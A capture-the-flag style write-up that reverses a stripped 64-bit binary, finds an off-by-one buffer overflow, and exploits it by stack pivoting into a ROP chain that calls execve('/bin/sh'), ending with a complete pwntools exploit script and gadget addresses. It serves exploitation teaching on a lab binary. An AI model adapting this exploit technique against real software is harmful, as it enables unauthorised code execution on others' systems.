 [link of the binary file](assets/stack_pivot/exercise3)

**Goal:** Exploit an off-by-one buffer overflow to pivot the stack, execute a Return-Oriented Programming (ROP) chain, and pop a shell.
### 1. Initial Recon

First, we check the security options enabled on the binary using `checksec`.

![alt](./assets/stack_pivot/1.png)

- **Canary:** No canary found.

- **PIE:** Disabled (No PIE).

- **NX:** Enabled (so no executing shellcode straight off the stack).

Running `file` on the binary, we see it is a statically linked 64-bit ELF, and more importantly, it is **stripped**. We are fucked!

Now let's run the program to see how it works:

![alt](./assets/stack_pivot/2.png)

It prints some dialogue and asks for input: "how much do you have to say?" followed by "Ok, what do you have to say for yourself?".

### 2. Diving into Ghidra

We open the binary in Ghidra. Even though it is stripped, Ghidra successfully finds the entry point. As always, it initializes the main function, which we can identify as `FUN_00400c46`.

![alt](./assets/stack_pivot/3.png)

Inside `main`, it calls a few other functions.

![alt](./assets/stack_pivot/4.png)

Looking through them, one function includes a direct `syscall`. This is a huge hint! We can later jump to this `syscall` instruction to execute an `execve` shell.

![alt](./assets/stack_pivot/5.png)

The other function just prints some dummy bullshit text.

![alt](./assets/stack_pivot/6.png)

However, `FUN_00400bd2` looks interesting. It sets up a 9-byte buffer, reads into it, and then passes it to a parsing function that returns an integer (likely `atoi`). It then checks if this integer's value is between 1 and `0x102` (258 decimal). If it falls in that range, it calls another function: `FUN_00400b73`.

![alt](./assets/stack_pivot/7.png)

How do we make sure the input function is `read`? If we look at the assembly inside it, it zeroes out `EAX` by XORing the register with itself (`XOR EAX, EAX`) and then issues a `syscall`.

![alt](./assets/stack_pivot/8.png)

Since the XOR of a number with itself is 0, it calls `syscall 0`. On x86-64, syscall 0 corresponds to `sys_read`.

![alt](./assets/stack_pivot/9.png)

To make Ghidra more straightforward, we can rename this custom read function to `read`.

![alt](./assets/stack_pivot/10.png)

Now let's take a look back at the parent function with our cleaned-up names:

![alt](./assets/stack_pivot/11.png)

Now let's see where `local_c` is coming from. We have `local_16`, which is our 9-byte string. It passes into a function that returns an integer into `local_c`. So the function we are talking about is definitely `atoi`.
Let's rename that as well to keep the decompilation clean:

![alt](./assets/stack_pivot/12.png)

### 3. Finding the Bug

Now we understand how to reach the vulnerable function `FUN_00400b73`: we must enter a number greater than 1, and less than 258 (`0x102` in hex).

This means the greatest number we can pass as the size argument is 257. However, if we look at `FUN_00400b73`, the array it writes this data into is exactly 256 bytes long. If we tell it to read 257 bytes, it will write 257 bytes into a 256-byte array, resulting in a **classic buffer overflow with exactly 1 byte of space!**

![alt](./assets/stack_pivot/13.png)

![alt](./assets/stack_pivot/14.png|718)

### 4. Crafting the Exploit (Stack Pivoting)

Because we only have a 1-byte overflow, we cannot reach the saved Return Address (RIP) on the stack. We can only overwrite the Least Significant Byte (LSB) of the saved Base Pointer (RBP).

When the function finishes and returns, it performs a `leave` instruction, which translates to:
1. `mov rsp, rbp` 
2. `pop rbp`

Because we successfully changed the LSB of the saved RBP, the RSP (Stack Pointer) is now forced to point directly into the middle of our 256-byte buffer!

Since PIE is disabled, we can use this "stack pivot" to execute a ROP chain we place inside our buffer. We just need a writable memory region to hold our `/bin/sh` string. Checking GDB, we find a solid candidate at `0x6b6030`.

![alt](./assets/stack_pivot/15.png)

Next, we extract our ROP gadgets to set up the `execve` syscall (which requires `rax=0x3b`, `rdi=0x6b6030`, `rsi=0`, `rdx=0`):

- `pop rsi ; ret` (`0x410a93`)

    ![alt](./assets/stack_pivot/16.png)

- `pop rdx ; ret` (`0x44c6b6`)
 
    ![alt](./assets/stack_pivot/17.png)

- `pop rax ; ret` (`0x415f04`)
    ![alt](./assets/stack_pivot/18.png)
- `pop rdi ; ret` (`0x400686`)
- 
    ![alt](./assets/stack_pivot/19.png|1046)

- Write-what-where gadget: `mov qword ptr [rdi], rcx ; ret` (`0x435b9b`)

    ![alt](./assets/stack_pivot/20.png)
    ![alt](./assets/stack_pivot/21.png)

We will also use `pop rcx ; ret` (`0x41d4e3`) and the `syscall` instruction we found earlier at `0x40132c`.

![alt](./assets/stack_pivot/22.png)
### 5. The Final Payload

We construct our ROP chain inside the buffer. Because ASLR slightly randomizes the exact stack addresses, overwriting the last byte of the RBP with `\x00` means our pivot might land slightly offset from our payload. To fix this, we can just wrap our exploit in a `for` loop and brute-force it until the stack aligns perfectly and pops our shell!

Here is the final exploit script:

```Python
from pwn import *

context.binary = elf = ELF('./exercise3')
writable_addr = 0x6b6030

# Gadgets
pop_rdi  = 0x400686
pop_rax  = 0x415f04
pop_rsi  = 0x410a93
pop_rdx  = 0x44c6b6
pop_rcx  = 0x41d4e3
mov_ptr  = 0x435b9b
syscall  = 0x40132c

bin_sh = b"/bin/sh\x00"

# ROP Chain Setup
chain = p64(pop_rdi) + p64(writable_addr)
chain += p64(pop_rcx) + bin_sh
chain += p64(mov_ptr)
chain += p64(pop_rax) + p64(0x3b)
chain += p64(pop_rdi) + p64(writable_addr)
chain += p64(pop_rsi) + p64(0)
chain += p64(pop_rdx) + p64(0)
chain += p64(syscall)

print(len(chain))

# Payload construction
payload  = b"A" * 120
payload += chain
payload += b"A" * (256 - len(payload))
payload += b"\x00"  # The 1-byte overflow to pivot the stack

# Brute-force the stack offset
for i in range(256):
    try:
        p = process('./exercise3', env={"DEBUG":"1"})

        p.send(b'257')
        p.send(payload)
        p.sendline(b'echo SHELL_OK')
        
        if b'SHELL_OK' in p.recvuntil(b'SHELL_OK', timeout=2):
             print(f"[+] Got shell after {i+1} tries (LSB: {hex(i)})")
             p.interactive()
             break
        p.close()
    except Exception:
        if 'p' in locals(): p.close()
        continue
```

![alt](./assets/stack_pivot/23.png)

We successfully got the shell as expected!
